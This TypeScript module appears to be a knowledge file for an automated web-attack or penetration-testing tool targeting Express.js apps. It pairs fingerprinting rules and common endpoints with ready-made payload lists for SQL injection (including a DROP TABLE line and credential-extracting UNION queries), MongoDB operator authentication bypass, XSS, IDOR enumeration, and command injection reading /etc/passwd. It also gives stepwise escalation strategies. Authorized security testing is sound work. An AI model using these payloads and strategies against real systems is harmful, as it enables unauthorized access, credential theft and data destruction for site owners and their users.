/**
 * Express.js / Node.js Knowledge
 */
import type { TechKnowledge } from '../types';

export const EXPRESS_KNOWLEDGE: TechKnowledge = {
  id: 'express',
  name: 'Express.js',
  category: 'framework',

  fingerprints: {
    headers: {
      'x-powered-by': /Express/i,
    },
    cookies: ['connect.sid', 'express:sess', 'express.sid'],
    bodyPatterns: [
      /Cannot (GET|POST|PUT|DELETE|PATCH)/,
      /SyntaxError: Unexpected token.*in JSON/,
    ],
    errorPatterns: [
      /at Layer\.handle/,
      /at Route\.dispatch/,
      /express.*node_modules/,
    ],
  },

  auth: {
    type: 'session',
    cookieName: 'connect.sid',
    loginEndpoint: '/login',
    logoutEndpoint: '/logout',
    commonMisconfigs: [
      'Session secret in source code',
      'Missing secure flag on cookies',
      'Session fixation vulnerability',
      'Predictable session IDs',
    ],
  },

  commonEndpoints: [
    '/api',
    '/api/v1',
    '/api/users',
    '/api/auth',
    '/api/login',
    '/api/register',
    '/api/me',
    '/api/profile',
    '/health',
    '/healthcheck',
    '/status',
    '/metrics',
    '/debug',
    '/graphql',
    '/socket.io',
  ],

  vulns: {
    sqli: {
      techniques: [
        {
          name: 'Sequelize Raw Query Injection',
          description: 'Exploit raw SQL queries in Sequelize ORM',
          how: 'Look for endpoints using sequelize.query() or $queryRaw',
          context: 'When raw queries are used with user input',
          examples: [
            "' OR '1'='1",
            "'; DROP TABLE users;--",
            "' UNION SELECT * FROM users--",
          ],
          payloads: [
            "' OR '1'='1",
            "' OR '1'='1'--",
            "' OR '1'='1'/*",
            "1' ORDER BY 1--",
            "1' UNION SELECT NULL--",
          ],
        },
        {
          name: 'TypeORM Query Builder Injection',
          description: 'Exploit TypeORM query builder with string concatenation',
          how: 'Test parameters in WHERE clauses built with strings',
          context: 'When using createQueryBuilder with user input',
          examples: [
            "admin'--",
            "' OR 1=1--",
          ],
          payloads: [
            "' OR '1'='1",
            "admin'--",
            "') OR ('1'='1",
          ],
        },
      ],
      payloads: [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "'; SELECT SLEEP(5);--",
        "1; SELECT * FROM users",
        "' UNION SELECT username,password FROM users--",
      ],
      indicators: {
        vulnerable: [
          'SQL syntax error',
          'SequelizeDatabaseError',
          'QueryFailedError',
          'SQLITE_ERROR',
          'PostgreSQL error',
          'MySQL error',
        ],
        notVulnerable: [
          'Parameterized query used',
          'Input validation error',
          'Invalid input format',
        ],
      },
      adaptiveStrategy: 'Start with single quote to detect SQL context. If Sequelize, try UNION-based. If TypeORM, try comment-based bypass.',
    },

    nosqli: {
      techniques: [
        {
          name: 'MongoDB Operator Injection',
          description: 'Inject MongoDB operators via JSON or query params',
          how: 'Send objects with $ne, $gt, $regex operators instead of strings',
          context: 'When using Mongoose/MongoDB with user input',
          examples: [
            '{"username": "admin", "password": {"$ne": ""}}',
            'username=admin&password[$ne]=x',
          ],
          payloads: [
            '{"$ne": ""}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
          ],
        },
        {
          name: 'Array Parameter Injection',
          description: 'Abuse Express query parser array handling',
          how: 'Send array parameters that become MongoDB operators',
          context: 'Express extended query parser with MongoDB',
          examples: [
            'user[$ne]=admin',
            'password[$regex]=^a',
          ],
          payloads: [
            'param[$ne]=value',
            'param[$gt]=',
            'param[$regex]=.*',
          ],
        },
      ],
      payloads: [
        '{"$ne": ""}',
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$exists": true}',
        '{"$regex": "^"}',
        'param[$ne]=x',
        'param[$gt]=',
      ],
      indicators: {
        vulnerable: [
          'Authentication bypass',
          'Unexpected data returned',
          'MongoError',
          'CastError',
        ],
        notVulnerable: [
          'Type validation error',
          'Schema validation failed',
          'Cast to string failed',
        ],
      },
      adaptiveStrategy: 'Try JSON body injection first. If that fails, try query parameter array notation. Check for $where if other operators blocked.',
    },

    xss: {
      techniques: [
        {
          name: 'Template Injection',
          description: 'XSS via server-side template engines (EJS, Pug, Handlebars)',
          how: 'Test parameters rendered in templates without escaping',
          context: 'When using res.render() with user input',
          examples: [
            '<script>alert(1)</script>',
            '{{constructor.constructor("alert(1)")()}}',
          ],
          payloads: [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '"><script>alert(1)</script>',
          ],
        },
        {
          name: 'JSON Response XSS',
          description: 'XSS via JSON responses with incorrect content-type',
          how: 'Check if JSON responses can be rendered as HTML',
          context: 'When JSON contains user input and content-type is wrong',
          examples: [
            '{"name": "<script>alert(1)</script>"}',
          ],
          payloads: [
            '<script>alert(document.domain)</script>',
            '"><img src=x onerror=alert(1)>',
          ],
        },
      ],
      payloads: [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<svg onload=alert(1)>',
        '{{constructor.constructor("alert(1)")()}}',
      ],
      indicators: {
        vulnerable: [
          'Script executes',
          'Payload reflected unescaped',
          'Content-Type: text/html with user input',
        ],
        notVulnerable: [
          'HTML entities encoded',
          'Content-Security-Policy header',
          'X-XSS-Protection: 1; mode=block',
        ],
      },
      adaptiveStrategy: 'Check response content-type first. If HTML, try basic XSS. If template engine detected, try template-specific payloads.',
    },

    idor: {
      techniques: [
        {
          name: 'Sequential ID Enumeration',
          description: 'Access resources by incrementing numeric IDs',
          how: 'Replace ID in URL/body with other users IDs',
          context: 'When using numeric IDs without ownership check',
          examples: [
            '/api/users/1 -> /api/users/2',
            '/api/orders/100 -> /api/orders/101',
          ],
          payloads: ['1', '2', '100', '101', '999'],
        },
        {
          name: 'MongoDB ObjectID Prediction',
          description: 'Guess MongoDB ObjectIDs based on timestamp',
          how: 'ObjectIDs contain timestamp - nearby IDs are predictable',
          context: 'When using MongoDB ObjectIDs as identifiers',
          examples: [
            '507f1f77bcf86cd799439011 -> 507f1f77bcf86cd799439012',
          ],
          payloads: [],
        },
      ],
      payloads: [
        '1', '2', '0', '-1', '999999',
        'admin', 'root', 'test',
      ],
      indicators: {
        vulnerable: [
          'Other user data returned',
          'No 403/401 on foreign resource',
          'Horizontal access successful',
        ],
        notVulnerable: [
          '403 Forbidden',
          '401 Unauthorized',
          'Access denied',
          'Not found (404 on invalid ID)',
        ],
      },
      adaptiveStrategy: 'First identify ID format (numeric vs ObjectID vs UUID). For numeric, try adjacent IDs. For ObjectID, try timestamp-based prediction.',
    },

    rce: {
      techniques: [
        {
          name: 'Child Process Injection',
          description: 'Command injection via child_process functions',
          how: 'Inject commands into exec(), spawn(), etc.',
          context: 'When user input reaches shell commands',
          examples: [
            '; id',
            '| cat /etc/passwd',
            '$(whoami)',
          ],
          payloads: [
            '; id',
            '| id',
            '`id`',
            '$(id)',
            '& id',
            '\n id',
          ],
        },
        {
          name: 'Prototype Pollution to RCE',
          description: 'Exploit prototype pollution for code execution',
          how: 'Pollute Object prototype to influence child_process',
          context: 'When prototype pollution exists and child_process is used',
          examples: [
            '{"__proto__": {"shell": "/proc/self/exe"}}',
          ],
          payloads: [
            '{"__proto__": {"shell": true}}',
            '{"constructor": {"prototype": {"shell": true}}}',
          ],
        },
      ],
      payloads: [
        '; id',
        '| id',
        '`id`',
        '$(id)',
        '; cat /etc/passwd',
        '| cat /etc/passwd',
        '; sleep 5',
        '| sleep 5',
      ],
      indicators: {
        vulnerable: [
          'Command output in response',
          'uid=',
          'root:x:',
          'Time delay matches sleep',
        ],
        notVulnerable: [
          'Input sanitized',
          'Command not found in output',
          'Shell metacharacters escaped',
        ],
      },
      adaptiveStrategy: 'Start with semicolon injection. If blocked, try pipe. If that fails, try backticks or $(). For blind injection, use sleep.',
    },
  },

  notes: [
    'Express uses extended query parser by default - enables array/object injection',
    'Check for X-Powered-By header (often disabled in production)',
    'Look for /debug, /metrics, /health endpoints',
    'Session cookies often named connect.sid',
    'Common ORMs: Sequelize, TypeORM, Mongoose, Prisma',
  ],

  relatedTech: ['nodejs', 'mongodb', 'postgresql', 'mysql', 'redis'],
};
